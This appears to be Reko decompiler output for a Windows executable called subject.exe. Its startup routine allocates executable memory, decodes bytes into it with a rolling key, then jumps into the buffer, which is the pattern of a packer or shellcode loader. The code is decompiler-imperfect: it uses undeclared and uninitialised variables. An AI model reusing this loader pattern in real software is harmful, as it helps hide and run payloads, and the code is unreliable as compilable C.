// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040EC5D: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	Eq_2 eax_12 = IsWindow(dwArg04);
	if ((eax_12 | 0x01) == 0x01)
		eax_12 = fn0040EC97((byte) GetPrivateProfileIntA(fp - 0x08, fp - 0x08, 252, fp - 0x08), mm4);
	return eax_12;
}

// 0040EC97: Register word32 fn0040EC97(Register byte bl, Register word64 mm4)
word32 fn0040EC97(byte bl, word64 mm4)
{
	Eq_34 eax_10 = VirtualAlloc(0x00, 85811, 0x3000, 0x40);
	word32 ecx_17 = 0x01F6;
	union Eq_48 * esi_22 = (union Eq_48 *) 166;
	Eq_34 edi_23 = eax_10;
	uint32 edx_28 = DPB(937090055, bl + 0x07, 0);
	word32 ebp_120 = 0x00;
	do
	{
		*edi_23 = (word32) *edi_23 + (byte) ((char *) (*esi_22) + edx_28);
		word32 ebp_65 = ebp_120 - 460344;
		uint32 edx_117 = edx_28 >> 0x08;
		esi_22 = (union Eq_48 *) ((char *) esi_22 + 0x01);
		edi_23 = edi_23 + 0x01;
		ebp_120 = ebp_65 + 0x00070639;
		byte dl_118 = (byte) edx_117;
		if (0x04 == ebp_65 + 0x00070639)
		{
			edx_117 = 937090055;
			dl_118 = 0x07;
			ebp_120 = 0x00;
		}
		byte dl_76 = dl_118 + bl;
		edx_28 = DPB(edx_117, dl_76, 0);
		ecx_17 = ecx_123 - 0x01;
		word32 ecx_123 = ecx_17;
	} while (ecx_123 != 0x01);
	word32 esp_86;
	word32 eax_87;
	byte * edi_88;
	byte SCZO_89;
	word32 esi_90;
	word32 ecx_91;
	word32 edx_92;
	byte dl_93;
	byte bl_94;
	word32 ebp_95;
	byte cl_96;
	byte SZO_97;
	byte Z_98;
	byte C_99;
	byte al_100;
	struct Eq_113 * es_101;
	word64 mm4_102;
	eax_10();
	if (ecx_91 != eax_87)
	{
		*edi_88 = al_100;
		(word32 *) 687722014 = (word32) mm4_102;
	}
	else
		return eax_87;
}

